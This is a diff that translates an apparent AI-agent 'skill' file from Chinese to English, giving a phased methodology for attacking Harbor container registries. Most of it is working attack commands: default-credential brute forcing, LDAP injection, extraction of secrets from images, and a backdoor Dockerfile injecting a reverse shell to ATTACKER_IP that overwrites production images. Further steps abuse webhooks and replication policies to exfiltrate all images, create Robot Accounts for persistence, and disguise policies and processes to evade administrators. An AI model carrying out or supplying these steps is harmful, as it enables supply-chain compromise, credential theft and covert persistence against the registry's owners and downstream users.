@@ -1,68 +1,70 @@
 ---
 name: harbor-tactics
-description: "Harbor 容器镜像仓库攻击。当发现目标运行 Harbor 实例、默认凭据 admin/Harbor12345 未修改、Harbor API 暴露、或需要从 Harbor 窃取镜像或注入后门时使用。覆盖未授权访问与公开仓库枚举、默认凭据攻击、镜像后门注入（供应链攻击）、Webhook 滥用、复制策略利用（跨仓库数据窃取）、镜像扫描绕过"
+description: "Harbor container image registry attacks. Use when a Harbor instance is discovered, the default credentials admin/Harbor12345 are unchanged, the Harbor API is exposed, or you need to steal images from Harbor or inject backdoors. Covers unauthorized access and public repository enumeration, default credential attacks, image backdoor injection (supply chain attacks), webhook abuse, replication policy exploitation (cross-registry data theft), and image scanning bypass"
+zh-signals: "攻击 Harbor 容器镜像仓库，涵盖默认凭据、未授权访问、镜像后门注入、Webhook 与复制策略滥用。信号:Harbor攻击,镜像仓库,默认凭据,供应链攻击,镜像后门"
+when-to-use: "Use when a Harbor registry is discovered and you need to test default credentials, unauthorized access, image backdoors, or replication abuse."
 metadata:
-  tags: "harbor,container-registry,镜像仓库,docker-registry,admin,Harbor12345,webhook,replication,供应链攻击,镜像后门"
+  tags: "harbor,container-registry,docker-registry,admin,Harbor12345,webhook,replication,supply-chain-attack,image-backdoor"
   category: "postexploit"
 ---
 
-# Harbor 容器镜像仓库渗透测试与利用方法论
+# Harbor Container Image Registry Penetration Testing and Exploitation Methodology
 
-Harbor 是企业级私有容器镜像仓库——提供镜像托管、漏洞扫描、签名验证、复制策略、Robot Account 等功能。默认管理员账户 `admin/Harbor12345` 在大量部署中未被修改，一旦获取管理员权限，攻击者可枚举并拉取所有项目镜像、从镜像层中提取硬编码凭据（环境变量/配置文件/私钥）、注入后门镜像实施供应链攻击、创建 Webhook 进行事件监控与数据外传、利用复制策略将镜像窃取到攻击者控制的 Registry、创建 Robot Account 实现持久化访问。
+Harbor is an enterprise-grade private container image registry offering image hosting, vulnerability scanning, signature verification, replication policies, Robot Accounts, and more. The default administrator account `admin/Harbor12345` remains unchanged in a large number of deployments. Once administrator access is obtained, an attacker can enumerate and pull images from all projects, extract hardcoded credentials from image layers (environment variables/config files/private keys), inject backdoored images to conduct supply chain attacks, create webhooks for event monitoring and data exfiltration, abuse replication policies to steal images to an attacker-controlled registry, and create Robot Accounts for persistent access.
 
-## 深入参考
+## Further Reading
 
-识别到具体攻击路径后，加载参考文档获取完整命令与利用 Payload：
+Once you have identified the specific attack path, load the reference document for the complete commands and exploitation payloads:
 
-- API 调用、镜像分析、注入模板、Webhook/复制策略配置 → 读 [references/attack-techniques.md](references/attack-techniques.md)
+- API calls, image analysis, injection templates, webhook/replication policy configuration → read [references/attack-techniques.md](references/attack-techniques.md)
 
-## Phase 1: 服务发现与版本识别
+## Phase 1: Service Discovery and Version Identification
 
-### 1.1 实例识别
+### 1.1 Instance Identification
 
-Harbor 的默认端口和指纹：
+Harbor default ports and fingerprints:
 
-| 组件 | 默认端口 | 识别特征 |
+| Component | Default Port | Identifying Features |
 |---|---|---|
-| Web UI / API | 80 / 443 | `/api/v2.0/systeminfo` 返回版本、`/harbor/sign-in` 登录页 |
-| Docker Registry API | 443 / 5000 | `/v2/` 返回 `{}` 或 401、`Docker-Distribution-API-Version` 响应头 |
-| Notary（镜像签名） | 4443 | TLS，Notary Server API |
-| Trivy（漏洞扫描） | 内部 | 通过 Harbor API 间接调用 |
+| Web UI / API | 80 / 443 | `/api/v2.0/systeminfo` returns a version, `/harbor/sign-in` login page |
+| Docker Registry API | 443 / 5000 | `/v2/` returns `{}` or 401, `Docker-Distribution-API-Version` response header |
+| Notary (image signing) | 4443 | TLS, Notary Server API |
+| Trivy (vulnerability scanning) | Internal | Invoked indirectly through the Harbor API |
 
 ```bash
-# 指纹探测
+# Fingerprint probing
 curl -sk https://TARGET/api/v2.0/systeminfo | jq .
-# 返回示例: {"with_notary":true,"with_trivy":true,"harbor_version":"v2.x.x",...}
+# Example response: {"with_notary":true,"with_trivy":true,"harbor_version":"v2.x.x",...}
 
-# Docker Registry API 探测
+# Docker Registry API probing
 curl -sk https://TARGET/v2/
-# 返回 {} 或 401 Unauthorized（确认是 Docker Registry）
+# Returns {} or 401 Unauthorized (confirms it is a Docker Registry)
 
-# 首页探测
+# Landing page probing
 curl -sk -o /dev/null -w "%{http_code}" https://TARGET/harbor/sign-in
 # 200 = Harbor Web UI
 ```
 
-### 1.2 版本与功能检测
+### 1.2 Version and Feature Detection
 
-版本信息决定可用的攻击面：
+The version determines the available attack surface:
 
-| 版本范围 | 关键特性 | 安全影响 |
+| Version Range | Key Features | Security Impact |
 |---|---|---|
-| v1.x | 旧版 API (`/api/`)、ChartMuseum | 部分 API 无需认证 |
-| v2.0-v2.4 | 新 API (`/api/v2.0/`)、Robot Account v1 | Robot Account 权限粗粒度 |
-| v2.5+ | Robot Account v2、Cosign 签名 | 细粒度权限但配置复杂 |
-| v2.8+ | OIDC 组映射、Proxy Cache | Proxy Cache 可能泄露上游凭据 |
+| v1.x | Legacy API (`/api/`), ChartMuseum | Some APIs require no authentication |
+| v2.0-v2.4 | New API (`/api/v2.0/`), Robot Account v1 | Coarse-grained Robot Account permissions |
+| v2.5+ | Robot Account v2, Cosign signing | Fine-grained permissions but complex configuration |
+| v2.8+ | OIDC group mapping, Proxy Cache | Proxy Cache may leak upstream credentials |
 
-## Phase 2: 认证检测与凭据获取
+## Phase 2: Authentication Detection and Credential Acquisition
 
-### 2.1 默认凭据测试
+### 2.1 Default Credential Testing
 
 ```bash
-# 默认管理员凭据（大量部署未修改）
+# Default administrator credentials (unchanged in many deployments)
 curl -sk -u admin:Harbor12345 https://TARGET/api/v2.0/users/current | jq .
 
-# 常见弱密码
+# Common weak passwords
 for pass in Harbor12345 harbor admin Admin123 password; do
   CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
     -u "admin:$pass" https://TARGET/api/v2.0/users/current)
@@ -70,203 +72,203 @@ for pass in Harbor12345 harbor admin Admin123 password; do
 done
 ```
 
-### 2.2 API Token 与 Docker Login
+### 2.2 API Token and Docker Login
 
 ```bash
-# Docker CLI 登录（成功后凭据缓存在 ~/.docker/config.json）
+# Docker CLI login (on success the credentials are cached in ~/.docker/config.json)
 docker login TARGET -u admin -p Harbor12345
 
-# 获取 Bearer Token（用于 Registry API）
+# Obtain a Bearer Token (for the Registry API)
 curl -sk "https://TARGET/service/token?service=harbor-registry&scope=registry:catalog:*" \
   -u admin:Harbor12345 | jq -r '.token'
 
-# 使用 Basic Auth 直接调用 API
+# Call the API directly with Basic Auth
 HARBOR_AUTH=$(echo -n 'admin:Harbor12345' | base64)
 curl -sk -H "Authorization: Basic $HARBOR_AUTH" https://TARGET/api/v2.0/projects
 ```
 
-### 2.3 LDAP/OIDC 认证绕过
+### 2.3 LDAP/OIDC Authentication Bypass
 
-Harbor 支持 LDAP/OIDC 外部认证。如果 LDAP 匿名绑定开启或 OIDC 配置不当，可能绕过认证：
+Harbor supports LDAP/OIDC external authentication. If anonymous LDAP binding is enabled or OIDC is misconfigured, authentication may be bypassed:
 
 ```bash
-# 检查认证模式
+# Check the authentication mode
 curl -sk https://TARGET/api/v2.0/systeminfo | jq '.auth_mode'
-# "db_auth" = 本地数据库, "ldap_auth" = LDAP, "oidc_auth" = OIDC
+# "db_auth" = local database, "ldap_auth" = LDAP, "oidc_auth" = OIDC
 
-# LDAP 认证模式下，尝试 LDAP 注入
-# username: *)(objectClass=* 或 admin)(&
+# In LDAP authentication mode, attempt LDAP injection
+# username: *)(objectClass=* or admin)(&
 ```
 
-## Phase 3: 攻击决策树
+## Phase 3: Attack Decision Tree
 
 ```
-发现 Harbor 实例
-├── 未认证
-│   ├── /api/v2.0/systeminfo → 确认版本与功能
-│   ├── /api/v2.0/projects → 公开项目枚举（project_public=true）
-│   ├── /v2/_catalog → Registry API 镜像目录（可能无需认证）
-│   ├── 默认凭据 admin/Harbor12345 → 尝试登录
-│   └── 无法登录 → 搜索泄露的 ~/.docker/config.json / Harbor Token
+Harbor instance discovered
+├── Unauthenticated
+│   ├── /api/v2.0/systeminfo → confirm the version and features
+│   ├── /api/v2.0/projects → enumerate public projects (project_public=true)
+│   ├── /v2/_catalog → Registry API image catalog (may require no authentication)
+│   ├── Default credentials admin/Harbor12345 → attempt login
+│   └── Unable to log in → search for leaked ~/.docker/config.json / Harbor Token
 │
-├── 已认证（管理员权限）
-│   ├── 项目与镜像枚举 → Phase 4
-│   │   ├── 所有项目列表 → 私有项目暴露
-│   │   ├── 镜像列表 → 拉取分析（凭据提取）
-│   │   └── Artifact 标签 → 识别生产/敏感镜像
+├── Authenticated (administrator privileges)
+│   ├── Project and image enumeration → Phase 4
+│   │   ├── All project list → private project exposure
+│   │   ├── Image list → pull and analyze (credential extraction)
+│   │   └── Artifact tags → identify production/sensitive images
 │   │
-│   ├── 镜像拉取与凭据提取 → Phase 5
-│   │   ├── docker pull → 本地分析镜像层
-│   │   ├── 环境变量 → API Key/数据库密码
-│   │   ├── 配置文件 → .env / config.yaml / application.properties
-│   │   └── 私钥/证书 → SSH Key / TLS 证书
+│   ├── Image pull and credential extraction → Phase 5
+│   │   ├── docker pull → analyze image layers locally
+│   │   ├── Environment variables → API keys/database passwords
+│   │   ├── Config files → .env / config.yaml / application.properties
+│   │   └── Private keys/certificates → SSH keys / TLS certificates
 │   │
-│   ├── 有 push 权限？
-│   │   └── 是 → 镜像后门注入（供应链攻击）→ Phase 6
+│   ├── Do you have push permissions?
+│   │   └── Yes → image backdoor injection (supply chain attack) → Phase 6
 │   │
-│   ├── 管理员功能
-│   │   ├── Webhook 创建 → 事件监控/数据外传 → Phase 7
-│   │   ├── 复制策略 → 窃取镜像到攻击者 Registry → Phase 8
-│   │   ├── Robot Account → 持久化访问 → Phase 9
-│   │   └── 漏洞扫描报告 → 已知漏洞情报 → Phase 10
+│   ├── Administrator features
+│   │   ├── Webhook creation → event monitoring/data exfiltration → Phase 7
+│   │   ├── Replication policy → steal images to an attacker registry → Phase 8
+│   │   ├── Robot Account → persistent access → Phase 9
+│   │   └── Vulnerability scan reports → known vulnerability intelligence → Phase 10
 │   │
-│   └── 用户管理 → 创建后门账户 / 提权
+│   └── User management → create backdoor accounts / privilege escalation
 │
-└── 已认证（普通用户）
-    ├── 可见项目枚举 → 镜像拉取与分析
-    ├── 项目成员列表 → 识别高权限用户
-    └── 尝试提权 → 项目管理员 → 系统管理员
+└── Authenticated (regular user)
+    ├── Enumerate visible projects → pull and analyze images
+    ├── Project member list → identify high-privilege users
+    └── Attempt privilege escalation → project admin → system admin
 ```
 
-## Phase 4: 项目与镜像枚举
+## Phase 4: Project and Image Enumeration
 
-### 4.1 项目枚举
+### 4.1 Project Enumeration
 
 ```bash
-# 列出所有项目（需要认证或仅返回公开项目）
+# List all projects (requires authentication, or returns only public projects)
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/projects?page_size=100" | jq '.[].name'
 
-# 项目详细信息（成员数、镜像数、存储配额）
+# Project details (member count, image count, storage quota)
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/projects?page_size=100" | \
   jq '.[] | {name, repo_count, metadata}'
 ```
 
-### 4.2 镜像仓库枚举
+### 4.2 Repository Enumeration
 
 ```bash
-# 指定项目的所有仓库
+# All repositories of a given project
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/projects/PROJECT_NAME/repositories?page_size=100" | \
   jq '.[].name'
 
-# Artifact（标签）列表
+# Artifact (tag) list
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/projects/PROJECT_NAME/repositories/REPO_NAME/artifacts" | \
   jq '.[] | {digest: .digest, tags: [.tags[]?.name], size: .size}'
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取批量枚举脚本
+→ read [references/attack-techniques.md](references/attack-techniques.md) for the batch enumeration script
 
-## Phase 5: 镜像拉取与凭据提取
+## Phase 5: Image Pulling and Credential Extraction
 
-镜像是最高价值的攻击目标——开发者经常在镜像中硬编码凭据、API Key、数据库连接字符串。
+Images are the highest-value attack targets — developers frequently hardcode credentials, API keys, and database connection strings inside images.
 
-### 5.1 镜像拉取
+### 5.1 Image Pulling
 
 ```bash
-# Docker CLI 拉取
+# Pull with the Docker CLI
 docker pull TARGET/PROJECT_NAME/IMAGE:TAG
 
-# 使用 skopeo 拉取（无需 Docker daemon）
+# Pull with skopeo (no Docker daemon required)
 skopeo copy --src-tls-verify=false \
   docker://TARGET/PROJECT_NAME/IMAGE:TAG \
   dir:./image-export/
 
-# 使用 crane 拉取
+# Pull with crane
 crane pull --insecure TARGET/PROJECT_NAME/IMAGE:TAG image.tar
 ```
 
-### 5.2 镜像分析与凭据提取
+### 5.2 Image Analysis and Credential Extraction
 
 ```bash
-# 查看镜像历史（暴露构建时的 ENV/ARG/COPY 操作）
+# View the image history (exposes ENV/ARG/COPY operations from the build)
 docker history TARGET/PROJECT_NAME/IMAGE:TAG --no-trunc
 
-# 使用 dive 逐层分析
+# Analyze layer by layer with dive
 dive TARGET/PROJECT_NAME/IMAGE:TAG
 
-# 导出镜像文件系统
+# Export the image filesystem
 docker save TARGET/PROJECT_NAME/IMAGE:TAG -o image.tar
 mkdir image-layers && tar xf image.tar -C image-layers/
 ```
 
-高价值搜索目标：
+High-value search targets:
 
-| 文件/路径 | 可能包含的凭据 |
+| File/Path | Possible Credentials |
 |---|---|
-| `/app/.env` / `/.env` | 数据库密码、API Key、Secret |
-| `/app/config.*` / `/etc/app/` | 应用配置（连接字符串） |
-| `~/.ssh/id_rsa` | SSH 私钥 |
+| `/app/.env` / `/.env` | Database passwords, API keys, secrets |
+| `/app/config.*` / `/etc/app/` | Application configuration (connection strings) |
+| `~/.ssh/id_rsa` | SSH private keys |
 | `~/.aws/credentials` | AWS AK/SK |
 | `/run/secrets/*` | Docker Secrets |
-| `ENV` 指令 | 环境变量中的凭据 |
+| `ENV` instruction | Credentials in environment variables |
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取自动化凭据搜索脚本
+→ read [references/attack-techniques.md](references/attack-techniques.md) for the automated credential search script
 
-## Phase 6: 镜像后门注入（供应链攻击）
+## Phase 6: Image Backdoor Injection (Supply Chain Attack)
 
-如果拥有 push 权限，可以篡改镜像植入后门：
+If you have push permissions, you can tamper with an image to implant a backdoor:
 
-### 6.1 攻击流程
+### 6.1 Attack Flow
 
 ```
-拉取目标镜像 → 添加恶意层 → 重新打标签 → 推送覆盖原镜像
+Pull the target image → add a malicious layer → re-tag → push to overwrite the original image
 ```
 
 ```bash
-# 拉取原始镜像
+# Pull the original image
 docker pull TARGET/PROJECT/IMAGE:latest
 
-# 创建后门 Dockerfile
+# Create the backdoor Dockerfile
 cat > Dockerfile.inject <<'DEOF'
 FROM TARGET/PROJECT/IMAGE:latest
-# 注入反弹 Shell 到启动脚本
+# Inject a reverse shell into the startup script
 RUN echo '#!/bin/sh' > /tmp/.init && \
     echo 'nohup sh -c "while true; do sh -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1; sleep 60; done" &' >> /tmp/.init && \
     chmod +x /tmp/.init
-# 修改 entrypoint 先执行后门
+# Modify the entrypoint to run the backdoor first
 COPY --from=0 / /
 ENTRYPOINT ["/bin/sh", "-c", "/tmp/.init; exec $0 $@"]
 DEOF
 
-# 构建并推送（覆盖原标签）
+# Build and push (overwriting the original tag)
 docker build -f Dockerfile.inject -t TARGET/PROJECT/IMAGE:latest .
 docker push TARGET/PROJECT/IMAGE:latest
 ```
 
-### 6.2 隐蔽注入技巧
+### 6.2 Stealth Injection Techniques
 
-- 使用多阶段构建减小额外层的大小差异
-- 后门进程名伪装为合法进程（如 `[kworker/0:1]`）
-- 使用已存在的基础镜像 layer 避免新增可疑层
-- 保持原始 ENTRYPOINT/CMD 不变，通过 `LD_PRELOAD` 或 init 脚本注入
+- Use a multi-stage build to reduce the size difference of the extra layer
+- Disguise the backdoor process name as a legitimate process (e.g. `[kworker/0:1]`)
+- Reuse an existing base image layer to avoid adding suspicious layers
+- Keep the original ENTRYPOINT/CMD unchanged and inject via `LD_PRELOAD` or an init script
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整后门 Dockerfile 模板
+→ read [references/attack-techniques.md](references/attack-techniques.md) for the complete backdoor Dockerfile templates
 
-## Phase 7: Webhook 滥用
+## Phase 7: Webhook Abuse
 
-Harbor Webhook 可以在镜像推送/拉取/删除等事件时通知外部服务——攻击者可利用此机制监控仓库活动或外传数据。
+Harbor webhooks can notify external services on events such as image push/pull/delete — an attacker can abuse this mechanism to monitor repository activity or exfiltrate data.
 
-### 7.1 Webhook 枚举与创建
+### 7.1 Webhook Enumeration and Creation
 
 ```bash
-# 列出项目的 Webhook
+# List the webhooks of a project
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" | jq .
 
-# 创建恶意 Webhook（监听所有事件）
+# Create a malicious webhook (listen to all events)
 curl -sk -X POST -u admin:Harbor12345 \
   -H "Content-Type: application/json" \
   "https://TARGET/api/v2.0/projects/PROJECT_ID/webhook/policies" \
@@ -285,31 +287,31 @@ curl -sk -X POST -u admin:Harbor12345 \
   }'
 ```
 
-Webhook 通知中包含项目名、仓库名、镜像标签、操作者用户名——可用于：
-- 监控哪些镜像被频繁拉取（识别生产镜像）
-- 监控新推送的镜像（窃取最新构建产物）
-- 收集操作者用户名（用于后续凭据攻击）
+Webhook notifications contain the project name, repository name, image tag, and the operator username — usable to:
+- Monitor which images are pulled frequently (identify production images)
+- Monitor newly pushed images (steal the latest build artifacts)
+- Collect operator usernames (for follow-up credential attacks)
 
-## Phase 8: 复制策略利用
+## Phase 8: Replication Policy Exploitation
 
-Harbor 复制策略可以自动将镜像同步到远程 Registry——攻击者可创建复制策略将所有镜像窃取到自己控制的 Registry。
+Harbor replication policies automatically sync images to a remote registry — an attacker can create a replication policy to steal all images to a registry they control.
 
-### 8.1 枚举现有复制策略
+### 8.1 Enumerate Existing Replication Policies
 
 ```bash
-# 列出复制策略
+# List replication policies
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/replication/policies" | jq .
 
-# 列出远程 Registry 端点
+# List remote registry endpoints
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/registries" | jq '.[] | {id, name, url, credential}'
 ```
 
-### 8.2 创建窃取策略
+### 8.2 Create a Theft Policy
 
 ```bash
-# 先注册攻击者 Registry 端点
+# First register the attacker registry endpoint
 curl -sk -X POST -u admin:Harbor12345 \
   -H "Content-Type: application/json" \
   "https://TARGET/api/v2.0/registries" \
@@ -321,7 +323,7 @@ curl -sk -X POST -u admin:Harbor12345 \
     "type": "docker-hub"
   }'
 
-# 创建复制策略（推送模式，所有镜像）
+# Create the replication policy (push mode, all images)
 curl -sk -X POST -u admin:Harbor12345 \
   -H "Content-Type: application/json" \
   "https://TARGET/api/v2.0/replication/policies" \
@@ -336,24 +338,24 @@ curl -sk -X POST -u admin:Harbor12345 \
   }'
 ```
 
-→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取自动触发与增量窃取配置
+→ read [references/attack-techniques.md](references/attack-techniques.md) for automatic trigger and incremental theft configuration
 
-## Phase 9: Robot Account 持久化
+## Phase 9: Robot Account Persistence
 
-Robot Account 是 Harbor 的服务账户机制——攻击者可创建 Robot Account 实现无需用户密码的持久化访问。
+Robot Accounts are Harbor's service account mechanism — an attacker can create a Robot Account for persistent access that requires no user password.
 
-### 9.1 Robot Account 管理
+### 9.1 Robot Account Management
 
 ```bash
-# 列出系统级 Robot Account
+# List system-level Robot Accounts
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/robots" | jq '.[] | {id, name, level, expires_at}'
 
-# 列出项目级 Robot Account
+# List project-level Robot Accounts
 curl -sk -u admin:Harbor12345 \
   "https://TARGET/api/v2.0/projects/PROJECT_NAME/robots" | jq .
 
-# 创建系统级 Robot Account（全项目 pull/push 权限）
+# Create a system-level Robot Account (pull/push on all projects)
 curl -sk -X POST -u admin:Harbor12345 \
   -H "Content-Type: application/json" \
   "https://TARGET/api/v2.0/robots" \
@@ -370,48 +372,48 @@ curl -sk -X POST -u admin:Harbor12345 \
       ]
     }]
   }'
-# 响应中的 secret 是一次性显示的密码，务必保存
+# The secret in the response is shown only once — be sure to save it
 ```
 
-## Phase 10: 漏洞扫描报告窃取
+## Phase 10: Vulnerability Scan Report Theft
 
-Harbor 内置 Trivy 漏洞扫描——扫描报告可用于识别目标环境中存在已知漏洞的镜像。
+Harbor has Trivy vulnerability scanning built in — the scan reports can be used to identify images in the target environment that carry known vulnerabilities.
 
 ```bash
-# 获取 Artifact 的漏洞报告
+# Obtain the vulnerability report of an artifact
 curl -sk -u admin:Harbor12345 \
   -H "X-Accept-Vulnerabilities: application/vnd.security.vulnerability.report; version=1.1" \
   "https://TARGET/api/v2.0/projects/PROJECT/repositories/REPO/artifacts/TAG/additions/vulnerabilities" | \
   jq '.. | .vulnerabilities? // empty | .[] | {id, severity, package, version, fix_version}'
 
-# 筛选 Critical/High 漏洞（可用于后续漏洞利用）
-# 关注: CVE 编号、受影响包名、修复版本
+# Filter Critical/High vulnerabilities (usable for follow-up exploitation)
+# Focus on: CVE numbers, affected package names, fix versions
 ```
 
-漏洞报告价值：
-- 识别运行中镜像的已知 CVE → 直接利用
-- 了解目标补丁策略（多久未修复 → 安全管理成熟度）
-- 定位含有特定漏洞的基础镜像（如 Log4j → 所有使用该基础镜像的服务受影响）
+Vulnerability report value:
+- Identify known CVEs in running images → exploit directly
+- Understand the target's patching discipline (how long unpatched → security management maturity)
+- Locate base images containing specific vulnerabilities (e.g. Log4j → every service using that base image is affected)
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 | 关键命令 |
+| Tool | Purpose | Key Commands |
 |---|---|---|
-| `curl` + Harbor API | REST API 调用 | `/api/v2.0/projects`、`/api/v2.0/robots` |
-| `docker` CLI | 镜像拉取/推送/分析 | `docker pull/push/history/save` |
-| `skopeo` | 无 daemon 镜像操作 | `skopeo copy/inspect/list-tags` |
-| `crane` | 轻量 Registry 工具 | `crane pull/push/ls/digest` |
-| `dive` | 镜像层分析 | `dive IMAGE` 逐层查看文件变更 |
-| `trivy` | 本地漏洞扫描 | `trivy image IMAGE` |
-| `jq` | JSON 解析 | 解析 API 响应 |
+| `curl` + Harbor API | REST API calls | `/api/v2.0/projects`, `/api/v2.0/robots` |
+| `docker` CLI | Image pull/push/analysis | `docker pull/push/history/save` |
+| `skopeo` | Daemonless image operations | `skopeo copy/inspect/list-tags` |
+| `crane` | Lightweight registry tooling | `crane pull/push/ls/digest` |
+| `dive` | Image layer analysis | `dive IMAGE` to inspect file changes layer by layer |
+| `trivy` | Local vulnerability scanning | `trivy image IMAGE` |
+| `jq` | JSON parsing | Parse API responses |
 
-## 注意事项
+## Notes
 
-- **审计日志**：Harbor 记录所有 API 调用、镜像拉取/推送、用户登录操作；管理员可在 "Logs" 页面查看所有审计事件
-- **默认凭据**：`admin/Harbor12345` 是安装时设置的默认密码，许多生产环境未修改；修改后原密码不可恢复
-- **镜像签名**：如果启用了 Cosign/Notary 签名验证，篡改后的镜像可能被拒绝部署——需同时伪造签名或禁用验证策略
-- **配额限制**：Harbor 支持项目级存储配额，大量拉取/推送可能触发配额告警
-- **复制策略**：创建的复制策略和 Registry 端点对所有管理员可见——命名应伪装为合法的灾备/同步策略
-- **Robot Account**：系统级 Robot Account 对所有管理员可见；项目级仅项目管理员可见——持久化时优先使用项目级
-- **Proxy Cache**：v2.8+ 的 Proxy Cache 项目可能缓存上游 Registry 的认证凭据——值得检查
-- **Garbage Collection**：Harbor GC 会清理未被标签引用的层——被覆盖的原始镜像可能在 GC 后永久丢失
+- **Audit logs**: Harbor records all API calls, image pull/push operations, and user logins; administrators can view all audit events on the "Logs" page
+- **Default credentials**: `admin/Harbor12345` is the default password set at install time and is unchanged in many production environments; once changed, the original password cannot be recovered
+- **Image signing**: if Cosign/Notary signature verification is enabled, tampered images may be rejected at deployment — you must forge the signature or disable the verification policy at the same time
+- **Quota limits**: Harbor supports project-level storage quotas, and heavy pull/push activity may trigger quota alerts
+- **Replication policies**: created replication policies and registry endpoints are visible to all administrators — name them to look like legitimate disaster recovery/sync policies
+- **Robot Accounts**: system-level Robot Accounts are visible to all administrators, project-level ones only to project administrators — prefer project-level for persistence
+- **Proxy Cache**: Proxy Cache projects in v2.8+ may cache authentication credentials of upstream registries — worth checking
+- **Garbage Collection**: Harbor GC cleans up layers not referenced by any tag — an overwritten original image may be permanently lost after GC
